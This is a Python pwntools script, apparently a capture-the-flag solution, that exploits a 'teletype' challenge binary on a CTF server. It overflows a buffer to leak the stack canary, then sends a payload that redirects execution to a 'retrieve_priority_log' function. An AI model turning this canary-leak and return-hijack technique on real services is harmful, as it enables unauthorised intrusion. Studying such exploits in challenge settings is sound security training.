#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './teletype'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'teletype.serv1.cbd2025.cloud', 443

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x401b64

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    canary = 0x0
    io = initialize()

    for i in range(20):
        io.sendlineafter(b'>', b'1')
        io.sendlineafter(b'>', b'26')
        io.sendafter(b'>', b'A'*0x28+b'B')
    io.sendline(b'')

    io.sendlineafter(b'>', b'2')
    io.recvuntil(b'AB')
    leak = io.recvline()
    print(leak)
    canary = b'\x00'+leak[:7]
    canary = u64(canary.ljust(8, b'\x00'))

    payload = flat({
        40: [
            canary,
            elf.bss()+0x100,
            elf.sym['retrieve_priority_log']
        ]
    })

    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', payload)
    io.sendlineafter(b'>', b'5')

    log.info("canary: %#x", canary)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
